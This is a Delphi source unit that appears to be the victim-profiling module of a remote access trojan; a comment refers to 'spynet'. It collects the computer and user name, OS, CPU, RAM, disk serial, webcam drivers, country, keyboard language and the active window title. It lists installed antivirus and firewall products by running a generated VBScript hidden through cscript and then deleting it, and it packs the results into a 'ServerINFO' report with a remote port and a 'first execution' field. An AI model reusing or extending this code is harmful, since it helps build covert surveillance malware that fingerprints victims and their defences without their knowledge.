Unit UnitInformacoes;

interface

uses
  windows,
  UnitDiversos;

type
  TSystemMem = (smMemoryLoad, smTotalPhys, smAvailPhys, smTotalPageFile, smAvailPageFile, smTotalVirtual, smAvailVirtual);

function GetCPUSpeed: string;
function GetRAMSize(aSystemMem: TSystemMem): int64;
function GetPCName: String;
function GetPCUser: String;
Function ExtractDiskSerial(Drive: String): String;
function GetOS: String;
function GetCPU: String;
function ListarDispositivosWebCam: String;
function GetUptime: String;
procedure GetFirewallandAntiVirusSoftware(var antivirus: string; var firewall: string);


function ListarMAININFO(NewIdentificacao, LocalAddress, Versao, RemotePort, FirstExecution: string): string;

implementation

uses
  UnitServerUtils,
  UnitComandos,
  UnitBytesSize,
  UnitBandeiras;

const
  PRODUCT_BUSINESS                      = $00000006; {Business Edition}
  PRODUCT_BUSINESS_N                    = $00000010; {Business Edition}
  PRODUCT_CLUSTER_SERVER                = $00000012; {Cluster Server Edition}
  PRODUCT_DATACENTER_SERVER             = $00000008; {Server Datacenter Edition (full installation)}
  PRODUCT_DATACENTER_SERVER_CORE        = $0000000C; {Server Datacenter Edition (core installation)}
  PRODUCT_ENTERPRISE                    = $00000004; {Enterprise Edition}
  PRODUCT_ENTERPRISE_N                  = $0000001B; {Enterprise Edition}
  PRODUCT_ENTERPRISE_SERVER             = $0000000A; {Server Enterprise Edition (full installation)}
  PRODUCT_ENTERPRISE_SERVER_CORE        = $0000000E; {Server Enterprise Edition (core installation)}
  PRODUCT_ENTERPRISE_SERVER_IA64        = $0000000F; {Server Enterprise Edition for Itanium-based Systems}
  PRODUCT_HOME_BASIC                    = $00000002; {Home Basic Edition}
  PRODUCT_HOME_BASIC_N                  = $00000005; {Home Basic Edition}
  PRODUCT_HOME_PREMIUM                  = $00000003; {Home Premium Edition}
  PRODUCT_HOME_PREMIUM_N                = $0000001A; {Home Premium Edition}
  PRODUCT_HOME_SERVER                   = $00000013; {Home Server Edition}
  PRODUCT_SERVER_FOR_SMALLBUSINESS      = $00000018; {Server for Small Business Edition}
  PRODUCT_SMALLBUSINESS_SERVER          = $00000009; {Small Business Server}
  PRODUCT_SMALLBUSINESS_SERVER_PREMIUM  = $00000019; {Small Business Server Premium Edition}
  PRODUCT_STANDARD_SERVER               = $00000007; {Server Standard Edition (full installation)}
  PRODUCT_STANDARD_SERVER_CORE          = $0000000D; {Server Standard Edition (core installation)}
  PRODUCT_STARTER                       = $0000000B; {Starter Edition}
  PRODUCT_STORAGE_ENTERPRISE_SERVER     = $00000017; {Storage Server Enterprise Edition}
  PRODUCT_STORAGE_EXPRESS_SERVER        = $00000014; {Storage Server Express Edition}
  PRODUCT_STORAGE_STANDARD_SERVER       = $00000015; {Storage Server Standard Edition}
  PRODUCT_STORAGE_WORKGROUP_SERVER      = $00000016; {Storage Server Workgroup Edition}
  PRODUCT_UNDEFINED                     = $00000000; {An unknown product}
  PRODUCT_ULTIMATE                      = $00000001; {Ultimate Edition}
  PRODUCT_ULTIMATE_N                    = $0000001C; {Ultimate Edition}
  PRODUCT_WEB_SERVER                    = $00000011; {Web Server Edition}
  PRODUCT_UNLICENSED                    = $ABCDABCD; {Unlicensed product}

type
  TMyOSVersionInfo = record
    IsServerEdition:  Boolean;
    Is64BitSystem:    Boolean;
    sCompleteDesc:    String;
    sWindows:         String;
    sServicePack:     String;
    Major:            Cardinal;
    Minor:            Cardinal;
    Build:            Cardinal;
    Special:          Cardinal;
    ServicePackMajor: Cardinal;
    ServicePackMinor: Cardinal;
  end;
 
// The struct used:
type
  TOSVersionInfoEx = record
    dwOSVersionInfoSize: DWORD;
    dwMajorVersion: DWORD;
    dwMinorVersion: DWORD;
    dwBuildNumber: DWORD;
    dwPlatformId: DWORD;
    szCSDVersion: array[0..127] of WideChar; { Maintenance UnicodeString for PSS usage }
    wServicePackMajor: WORD;
    wServicePackMinor: WORD;
    wSuiteMask: WORD;
    wProductType: BYTE;
    wReserved:BYTE;
  end;

var
{$EXTERNALSYM GetProductInfo}
  GetProductInfo: function (dwOSMajorVersion, dwOSMinorVersion,
                            dwSpMajorVersion, dwSpMinorVersion: DWORD;
                            var pdwReturnedProductType: DWORD): BOOL stdcall = NIL;
function GetVersionEx(var lpVersionInformation: TOSVersionInfoEx): BOOL; stdcall; external kernel32 name 'GetVersionExW';

function GetOSInformation: TMyOSVersionInfo;
var
  SysInfo: TSystemInfo;
  VerInfo: TOSVersionInfoEx;
  bExtendedInfo: Boolean;
  // Only available on Windows 2008, Vista, 7 (or better)
  dwMajor:        DWORD;
  dwMinor:        DWORD;
  dwSpMajor:      DWORD;
  dwSpMinor:      DWORD;
  dwProductType:  DWORD;
const
  PROCESSOR_ARCHITECTURE_AMD64             = $00000009;
  VER_NT_WORKSTATION                       = $00000001;
  VER_NT_DOMAIN_CONTROLLER                 = $00000002;
  VER_NT_SERVER                            = $00000003;
  VER_SUITE_BACKOFFICE                     = $00000004;
  VER_SUITE_BLADE                          = $00000400;
  VER_SUITE_COMPUTE_SERVER                 = $00004000;
  VER_SUITE_DATACENTER                     = $00000080;
  VER_SUITE_ENTERPRISE                     = $00000002;
  VER_SUITE_EMBEDDEDNT                     = $00000040;
  VER_SUITE_PERSONAL                       = $00000200;
  VER_SUITE_SINGLEUSERTS                   = $00000100;
  VER_SUITE_SMALLBUSINESS                  = $00000001;
  VER_SUITE_SMALLBUSINESS_RESTRICTED       = $00000020;
  VER_SUITE_STORAGE_SERVER                 = $00002000;
  VER_SUITE_TERMINAL                       = $00000010;
  VER_SUITE_WH_SERVER                      = $00008000;
begin
  Result.IsServerEdition  := False;
  Result.sWindows         := 'Unknown';
  Result.Special          := 0;
  Result.Major            := 0;
  Result.Minor            := 0;
  Result.Build            := 0;
  Result.ServicePackMajor := 0;
  Result.ServicePackMinor := 0;
  Result.IsServerEdition  := False;
  Result.Is64BitSystem    := (SizeOf(Pointer)=8);
 
  bExtendedInfo := True;
  VerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfoEx);
  if not (GetVersionEx(VerInfo)) then
  begin
    bExtendedInfo := False;
    VerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
    if not (GetVersionEx(VerInfo)) then VerInfo.dwOSVersionInfoSize := 0;
  end;
 
  if not (VerInfo.dwOSVersionInfoSize=0) then
  begin
    Result.Major := VerInfo.dwMajorVersion;
    Result.Minor := VerInfo.dwMinorVersion;
    Result.Build := VerInfo.dwBuildNumber;
    Result.IsServerEdition := ((VerInfo.dwPlatformId=VER_PLATFORM_WIN32_NT) and not (VerInfo.wProductType=VER_NT_WORKSTATION));
    if (bExtendedInfo) then
    begin
      Result.ServicePackMajor := VerInfo.wServicePackMajor;
      Result.ServicePackMinor := VerInfo.wServicePackMinor;
    end;
    GetSystemInfo(SysInfo);
 
    case VerInfo.dwPlatformId of
      VER_PLATFORM_WIN32s:
        Result.sWindows := 'Windows 3.1';
      VER_PLATFORM_WIN32_WINDOWS:
      begin
        if (Result.Major=4) and (Result.Minor=0) then
          if (VerInfo.szCSDVersion[1]='C') or (VerInfo.szCSDVersion[1]='B') then
            Result.sWindows := 'Windows 95 (Release 2)'
          else
            Result.sWindows := 'Windows 95'
        else if (Result.Major=4) and (Result.Minor=10) and (VerInfo.szCSDVersion[1]='A') then
          Result.sWindows := 'Windows 98 SE'
        else if (Result.Major=4) and (Result.Minor=10) then
          Result.sWindows := 'Windows 98'
        else if (Result.Major=4) and (Result.Minor=90) then
          Result.sWindows := 'Windows ME';
      end;
      VER_PLATFORM_WIN32_NT:
      begin
        if (VerInfo.wProductType=VER_NT_WORKSTATION) then
        begin
          if (VerInfo.dwMajorVersion=6) then
          begin
            if (VerInfo.dwMinorVersion=1) then
              Result.sWindows := 'Windows 7'
            else if (VerInfo.dwMinorVersion=0) then
              Result.sWindows := 'Windows Vista';

            if Assigned(GetProductInfo) then
            begin
              GetProductInfo(VerInfo.dwMajorVersion, VerInfo.dwMinorVersion, VerInfo.wServicePackMajor, VerInfo.wServicePackMinor, dwProductType);

              case dwProductType of
                1: Result.sWindows := Format('%s %s', [Result.sWindows, 'Ultimate']);
                2: Result.sWindows := Format('%s %s', [Result.sWindows, 'Home Basic']);
                3: Result.sWindows := Format('%s %s', [Result.sWindows, 'Premium']);
                4: Result.sWindows := Format('%s %s', [Result.sWindows, 'Enterprise']);
                5: Result.sWindows := Format('%s %s', [Result.sWindows, 'Home Basic N']);
                6: Result.sWindows := Format('%s %s', [Result.sWindows, 'Business']);
                11: Result.sWindows := Format('%s %s', [Result.sWindows, 'Starter']);
                16: Result.sWindows := Format('%s %s', [Result.sWindows, 'Business N']);
                26: Result.sWindows := Format('%s %s', [Result.sWindows, 'Premium N']);
                27: Result.sWindows := Format('%s %s', [Result.sWindows, 'Enterprise N']);
                28: Result.sWindows := Format('%s %s', [Result.sWindows, 'Ultimate N']);
                else Result.sWindows := Format('%s %s', [Result.sWindows, '(unknown edition)']);
              end;
            end;
          end
          else if (VerInfo.dwMajorVersion=5) then
          begin
            if (VerInfo.dwMinorVersion=2) and (SysInfo.wProcessorArchitecture=PROCESSOR_ARCHITECTURE_AMD64) then
              Result.sWindows := 'Windows XP Professional x64'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_PERSONAL<>0) and (VerInfo.dwMinorVersion=1) then
              Result.sWindows := 'Windows XP Home'
            else
              if (VerInfo.dwMinorVersion=1) then
                Result.sWindows := 'Windows XP Professional'
              else
                Result.sWindows := 'Windows 2000 Professional';
          end
          else
            Result.sWindows := Format('Windows NT %d.%d', [VerInfo.dwMajorVersion, VerInfo.dwMinorVersion]);
        end else begin
          if (VerInfo.dwMajorVersion=6) and (VerInfo.dwMinorVersion=0) then
          begin
            Result.sWindows := 'Windows 2008';

            if Assigned(GetProductInfo) then
            begin
              GetProductInfo(VerInfo.dwMajorVersion, VerInfo.dwMinorVersion, VerInfo.wServicePackMajor, VerInfo.wServicePackMinor, dwProductType);
 
              case dwProductType of
                7: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Standard']);
                8: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Datacenter']);
                10: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Enterprise']);
                12: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Datacenter']);
                13: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Standard']);
                14: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Enterprise']);
                15: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Enterprise IA64']);
                17: Result.sWindows := Format('%s %s Server', [Result.sWindows, 'Web']);
                else Result.sWindows := Result.sWindows + ' Server (unknown edition)';
              end;
            end;
          end
          else if (VerInfo.dwMajorVersion=5) and (VerInfo.dwMinorVersion=2) then
          begin
            if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_DATACENTER<>0) then
              Result.sWindows := 'Windows 2003 Server Datacenter'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE<>0) then
              Result.sWindows := 'Windows 2003 Server Enterprise'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_BLADE<>0) then
              Result.sWindows := 'Windows 2003 Server Web Edition'
            else
              Result.sWindows := 'Windows 2003 Server';
          end
          else if (VerInfo.dwMajorVersion=5) and (VerInfo.dwMinorVersion=2) then
          begin
            if (bExtendedInfo) and (VerInfo.wSuiteMask=VER_SUITE_WH_SERVER) then
              Result.sWindows := 'Windows Home Server'
            else
            begin
              if not (GetSystemMetrics(89)=0) then
                Result.sWindows := 'Windows 2003 Server'
              else
                Result.sWindows := 'Windows 2003 Server (Release 2)';
            end;
          end
          else if (VerInfo.dwMajorVersion=5) and (VerInfo.dwMinorVersion=0) then
          begin
            if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_DATACENTER<>0) then
              Result.sWindows := 'Windows 2000 Server Datacenter'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE<>0) then
              Result.sWindows := 'Windows 2000 Server Enterprise'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_BLADE<>0) then
              Result.sWindows := 'Windows 2000 Server Web Edition'
            else
              Result.sWindows := 'Windows 2000 Server';
          end
          else
          begin
            if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_DATACENTER<>0) then
              Result.sWindows := 'Windows NT 4.0 Server Datacenter'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_ENTERPRISE<>0) then
              Result.sWindows := 'Windows NT 4.0 Server Enterprise'
            else if (bExtendedInfo) and (VerInfo.wSuiteMask and VER_SUITE_BLADE<>0) then
              Result.sWindows := 'Windows NT 4.0 Server Web Edition'
            else
              Result.sWindows := 'Windows NT 4.0 Server';
          end;
        end;
      end;
      else
        Result.sWindows := Format('Unknown Platform ID (%d)', [VerInfo.dwPlatformId]);
    end;
  end;

  Result.sServicePack  := Format('%d.%d', [Result.ServicePackMajor, Result.ServicePackMinor]);
  Result.sCompleteDesc := Format('%s (Build: %d', [Result.sWindows, Result.Build]);
  if not (Result.ServicePackMajor=0) then Result.sCompleteDesc := Result.sCompleteDesc + Format(' - Service Pack: %s', [Result.sServicePack]);
  Result.sCompleteDesc := Result.sCompleteDesc + ')';
end;

function GetOS: string;
var
  VerInfo: TMyOSVersionInfo;
begin
  @GetProductInfo := GetProcAddress(GetModuleHandle('KERNEL32.DLL'), 'GetProductInfo');
  VerInfo           := GetOSInformation;
  //messagebox(0, pchar(VerInfo.sCompleteDesc + #13#10 +
  //                    IntToStr(VerInfo.Major) + #13#10 +
  //                    IntToStr(VerInfo.Minor) + #13#10 +
  //                    IntToStr(VerInfo.Build) + #13#10 +
  //                    VerInfo.sServicePack + #13#10 +
  //                    BoolToStr(VerInfo.Is64BitSystem, True) + #13#10 +
  //                    BoolToStr(VerInfo.IsServerEdition, True)), '', 0);
  Result := VerInfo.sCompleteDesc;
end;

procedure GetFirewallandAntiVirusSoftware(var antivirus: string; var firewall: string);
var
  linha: string;
  f: TextFile;
  VBSFile, InfoFile: String;
  i: Integer;
  time: integer;
  msg: tmsg;
begin
  VBSFile := mytempfolder + 'teste.vbs';
  InfoFile := mytempfolder + 'teste.txt';
  AssignFile(f, VBSFile);
  ReWrite(f);
  // Stuff is needed ..
  WriteLn(f, 'Set objSecurityCenter = GetObject("winmgmts:\\.\root\SecurityCenter")');
  WriteLn(f, 'Set colFirewall = objSecurityCenter.ExecQuery("Select * From FirewallProduct",,48)');
  WriteLn(f, 'Set colAntiVirus = objSecurityCenter.ExecQuery("Select * From AntiVirusProduct",,48)');
  WriteLn(f, 'Set objFileSystem = CreateObject("Scripting.fileSystemObject")');
  WriteLn(f, 'Set objFile = objFileSystem.CreateTextFile("' + InfoFile + '", True)');
  WriteLn(f, 'Enter = Chr(13) + Chr(10)');
  WriteLn(f, 'CountFW = 0');
  WriteLn(f, 'CountAV = 0');
  // Firewall(s)
  WriteLn(f, 'For Each objFirewall In colFirewall');
  WriteLn(f, 'CountFW = CountFW + 1');
  WriteLn(f, 'Info = Info & "F" & CountFw & ") " & objFirewall.displayName & " v" & objFirewall.versionNumber & Enter');
  WriteLn(f, 'Next');
  // AntiVirus
  WriteLn(f, 'For Each objAntiVirus In colAntiVirus');
  WriteLn(f, 'CountAV = CountAV + 1');
  WriteLn(f, 'Info = Info & "A" & CountAV & ") " & objAntiVirus.displayName & " v" & objAntiVirus.versionNumber & Enter');
  WriteLn(f, 'Next');
  // Write to File
  WriteLn(f, 'objFile.WriteLine(Info)');
  WriteLn(f, 'objFile.Close');
  CloseFile(f);
  if fileexists(mysystemfolder + 'cscript.exe') then
  MyShellExecute(0, 'open', pchar(mysystemfolder + 'cscript.exe'), PChar('"' + VBSFile + '"'), pchar(extractfilepath(VBSFile)), SW_HIDE) else
  if fileexists(mywindowsfolder + 'cscript.exe') then
  MyShellExecute(0, 'open', pchar(mywindowsfolder + 'cscript.exe'), PChar('"' + VBSFile + '"'), pchar(extractfilepath(VBSFile)), SW_HIDE) else
  begin
    antivirus := '';
    firewall := '';
    exit;
  end;

  time := gettickcount;
  while fileexists(InfoFile) = false do
  begin
    TranslateMessage(msg);
    DispatchMessage(msg);
    if gettickcount > time + 5000 then
    begin
      antivirus := '';
      firewall := '';
      exit;
      break;
    end;
  end;
  sleep(100);

  DeleteFile(pchar(VBSFile));

  antivirus := '';
  firewall := '';

  AssignFile(f, InfoFile);
  Reset(f);
  While not eof(f) do
  begin
    Readln(f,linha); //lê do arquivo e desce uma linha. O conteúdo lido é transferido para a variável linha
    if copy(linha, 1, 1) = 'F' then
    begin
      delete(linha, 1, 4);
      Firewall := Firewall + linha + ' / '; // o espaço foi colocado devido a config do cliente
    end else                                          // na hora de organizar os nomes
    if copy(linha, 1, 1) = 'A' then
    begin
      delete(linha, 1, 4);
      antivirus := antivirus + linha + ' / ';
    end;
  end;
  closefile(f);
  DeleteFile(pchar(InfoFile)); // aqui ficam todos os AV/FW instalados
end;

function GetCPUSpeed: string;
var
  TimerHi, TimerLo: DWORD;
  PriorityClass, Priority: Integer;
  Total: int64;
begin
  PriorityClass := GetPriorityClass(GetCurrentProcess);
  Priority := GetThreadPriority(GetCurrentThread);
  SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
  SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
  Sleep(10);
  asm
    dw 310Fh
    mov TimerLo, eax
    mov TimerHi, edx
    push 500
    call Sleep
    dw 310Fh
    sub eax, TimerLo
    sbb edx, TimerHi
    mov TimerLo, eax
    mov TimerHi, edx
  end;
  SetThreadPriority(GetCurrentThread, Priority);
  SetPriorityClass(GetCurrentProcess, PriorityClass);
  Total := Round(TimerLo / (500000));
  Result := inttostr(Total);
end;

function GetRAMSize(aSystemMem: TSystemMem): int64;
type
  // Record for more than 2 gb RAM.
  TMemoryStatusEx = packed record
    dwLength: DWORD;
    dwMemoryLoad: DWORD;
    ullTotalPhys: Int64;
    ullAvailPhys: Int64;
    ullTotalPageFile: Int64;
    ullAvailPageFile: Int64;
    ullTotalVirtual: Int64;
    ullAvailVirtual: Int64;
    ullAvailExtendedVirtual: Int64;
  end;
  // Function for more than 2 gb RAM (function available in Win2000+).
  PFNGlobalMemoryStatusEx = function(var lpBuffer: TMemoryStatusEx): BOOL; stdcall;
var
  P: Pointer;
  GlobalMemoryStatusEx: PFNGlobalMemoryStatusEx;
  CFGDLLHandle: THandle;
  MemoryStatusEx: TMemoryStatusEx; // Win2000+
  MemoryStatus: TMemoryStatus;     // Win9x
  nResult: int64;
begin
  nResult := -1;
  GlobalMemoryStatusEx := nil;
  CFGDLLHandle := 0;
  P := nil;
  // Load library dynamicly if exists.
  CFGDLLHandle := LoadLibrary('kernel32.dll');
  if (CFGDLLHandle <> 0) then
    begin
    P := GetProcAddress(CFGDLLHandle, 'GlobalMemoryStatusEx');
    if (P = nil) then
      begin
      FreeLibrary(CFGDLLHandle);
      CFGDllHandle := 0;
      end
    else
      GlobalMemoryStatusEx := PFNGlobalMemoryStatusEx(P);
    end;
  if (@GlobalMemoryStatusEx <> nil) then
    begin
    ZeroMemory(@MemoryStatusEx, SizeOf(TMemoryStatusEx));
    MemoryStatusEx.dwLength := SizeOf(TMemoryStatusEx);
    GlobalMemoryStatusEx(MemoryStatusEx);
    case aSystemMem of
      smMemoryLoad    : nResult := MemoryStatusEx.dwMemoryLoad;
      smTotalPhys     : nResult := MemoryStatusEx.ullTotalPhys;
      smAvailPhys     : nResult := MemoryStatusEx.ullAvailPhys;
      smTotalPageFile : nResult := MemoryStatusEx.ullTotalPageFile;
      smAvailPageFile : nResult := MemoryStatusEx.ullAvailPageFile;
      smTotalVirtual  : nResult := MemoryStatusEx.ullTotalVirtual;
      smAvailVirtual  : nResult := MemoryStatusEx.ullAvailVirtual;
      end;
    FreeLibrary(CFGDLLHandle);
    end;
  // "Old" method if library is not available.
  if nResult = - 1 then
    begin
    with MemoryStatus do
      begin
      dwLength := SizeOf(TMemoryStatus);
      Windows.GlobalMemoryStatus(MemoryStatus);
      case aSystemMem of
        smMemoryLoad    : nResult := dwMemoryLoad;
        smTotalPhys     : nResult := dwTotalPhys;
        smAvailPhys     : nResult := dwAvailPhys;
        smTotalPageFile : nResult := dwTotalPageFile;
        smAvailPageFile : nResult := dwAvailPageFile;
        smTotalVirtual  : nResult := dwTotalVirtual;
        smAvailVirtual  : nResult := dwAvailVirtual;
        end;
      end;
    end;
  Result := nResult;
end;

function GetPCName(): String;
var
  PC: Pchar;
  Tam: Cardinal;
begin
  Result := '';
  Tam := 100;
  Getmem(PC, Tam);
	GetComputerName(PC, Tam);
  Result := PC;
  FreeMem(PC);
end;

function GetPCUser(): String;
var
  User: Pchar;
  Tam: Cardinal;
begin
  Result := '';
  Tam := 100;
  Getmem(User, Tam);
	GetUserName(User, Tam);
  Result := User;
  FreeMem(User);
end;

function GetCPU(): String;
begin
  Result := '';
  Result := lerreg(HKEY_LOCAL_MACHINE, 'HARDWARE\DESCRIPTION\System\CentralProcessor\0', 'ProcessorNameString', '');

  // para usar no spynet
  result := replacestring('|', '/', result);
end;
{
function GetOS: String;
var
  osVerInfo: TOSVersionInfo;
begin
  Result := 'Unknow';

  osVerInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
  GetVersionEx(osVerInfo);
  case osVerInfo.dwPlatformId of
    VER_PLATFORM_WIN32_NT: begin
      case osVerInfo.dwMajorVersion of
        4: Result := 'Windows NT 4.0';
        5: case osVerInfo.dwMinorVersion of
             0: Result:= 'Windows 2000';
             1: Result:= 'Windows XP';
             2: Result:= 'Windows Server 2003';
           end;
        6: Result:= 'Windows Vista';
      end;
    end;
    VER_PLATFORM_WIN32_WINDOWS: begin
      case osVerInfo.dwMinorVersion of
        0: Result := 'Windows 95';
       10: Result := 'Windows 98';
       90: Result := 'Windows Me';
      end;
    end;
  end;
  if osVerInfo.szCSDVersion <> '' then
    Result := Result + ' ' + osVerInfo.szCSDVersion;
end;
}
function MycapGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR; cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL;
var
  xcapGetDriverDescriptionA: function(wDriverIndex: UINT; lpszName: LPSTR; cbName: integer; lpszVer: LPSTR; cbVer: integer): BOOL; stdcall;
begin
  xcapGetDriverDescriptionA := GetProcAddress(LoadLibrary(pchar('AVICAP32.dll')), pchar('capGetDriverDescriptionA'));
  Result := xcapGetDriverDescriptionA(wDriverIndex, lpszName, cbName, lpszVer, cbVer);
end;

function ListarDispositivosWebCam: String;
var
  szName,
  szVersion: array[0..MAX_PATH] of char;
  iReturn: Boolean;
  x: integer;
begin
  Result := '';
  x := 0;
  repeat
    iReturn := MycapGetDriverDescriptionA(x, @szName, sizeof(szName), @szVersion, sizeof(szVersion));
    If iReturn then
    begin
     Result := Result + szName + ' - ' + szVersion + '|';
     Inc(x);
    end;
  until iReturn = False;
end;

function GetUptime(): String;
var
  Tiempo, Dias, Horas, Minutos: Cardinal;
begin
  Result := '';
 	Tiempo := GetTickCount();
  Dias   := Tiempo div (1000 * 60 * 60 * 24);
  Tiempo := Tiempo - Dias * (1000 * 60 * 60 * 24);
  Horas  := Tiempo div (1000 * 60 * 60);
  Tiempo := Tiempo - Horas * (1000 * 60 * 60);
  Minutos:= Tiempo div (1000 *60);
  Result := IntToStr(Dias) + 'd ' + IntToStr(Horas) + 'h ' + IntToStr(Minutos) + 'm';
end;

function IntToHex(dwNumber: DWORD; Len: Integer): String; overload;
const
  HexNumbers:Array [0..15] of Char = ('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                                      'A', 'B', 'C', 'D', 'E', 'F');
begin
  Result := '';
  while dwNumber <> 0 do
  begin
    Result := HexNumbers[Abs(dwNumber mod 16)] + Result;
    dwNumber := dwNumber div 16;
  end;
  if Result = '' then
  begin
    while Length(Result) < Len do
      Result := '0' + Result;
    Exit;
  end;
  if Result[Length(Result)] = '-' then
  begin
    Delete(Result, Length(Result), 1);
    Insert('-', Result, 1);
  end;
  while Length(Result) < Len do
    Result := '0' + Result;
end;

Function ExtractDiskSerial(Drive: String): String;
Var
  Serial:DWord;
  DirLen,Flags: DWord;
  DLabel : Array[0..11] of Char;
begin
  Result := '';
  GetVolumeInformation(PChar(Drive),dLabel,12,@Serial,DirLen,Flags,nil,0);
  Result := IntToHex(Serial,8);
end;

function MegaTrim(str: string): string;
begin
  while pos('  ', str) >= 1 do delete(str, pos('  ', str), 1);
  result := str;
end;

type
  ServerINFO = record
    Identificacao: shortString;
    LocalAddress: shortString;
    PcName_PcUser: shortString;
    Webcam: shortString;
    GetOS: shortString;
    GetCPU: shortString;
    RAMSize: shortString;
    AntiVirus: shortString;
    Firewall: shortString;
    Versao: shortString;
    RemotePort: shortString;
    Ping: shortString;
    ActiveCaption: shortString;
    Flag: shortString;
    Bandeira: shortString;
    FirstExecution: shortString;
  end;

function ListarMAININFO(NewIdentificacao, LocalAddress, Versao, RemotePort, FirstExecution: string): string;
var
  av, fw, Webcam: string;
  Flag: integer;
  Bandeira: string;
  Resultado: ServerINFO;
  TempStr: string;
begin
  GetFirewallandAntiVirusSoftware(av, fw);

  if ListarDispositivosWebCam <> '' then Webcam := 'X' else Webcam := '-';

  Flag := GetCountryCode(GetCountryAbreviacao);
  Bandeira := GetCountryName('', Flag) + ' / ' + GetActiveKeyboardLanguage;

  Resultado.Identificacao := NewIdentificacao + '_' + ExtractDiskSerial(myrootfolder);
  Resultado.LocalAddress := LocalAddress;
  Resultado.PcName_PcUser := GetPCName + '/' + GetPCUser;
  Resultado.Webcam := Webcam;
  Resultado.GetOS := GetOS;
  Resultado.GetCPU := MegaTrim(GetCPU);
  Resultado.RAMSize := BytesSize(GetRAMSize(smTotalPhys));
  Resultado.AntiVirus := av;
  Resultado.Firewall := fw;
  Resultado.Versao := Versao;
  Resultado.RemotePort := RemotePort;
  Resultado.Ping := ' ';
  Resultado.ActiveCaption := ActiveCaption;
  Resultado.Flag := inttostr(Flag);
  Resultado.Bandeira := Bandeira;
  Resultado.FirstExecution := FirstExecution;
  setlength(TempStr, sizeof(ServerINFO));
  CopyMemory(@TempStr[1], @Resultado, sizeof(ServerINFO));
  result := MAININFO + '|' + TempStr;
end;


end.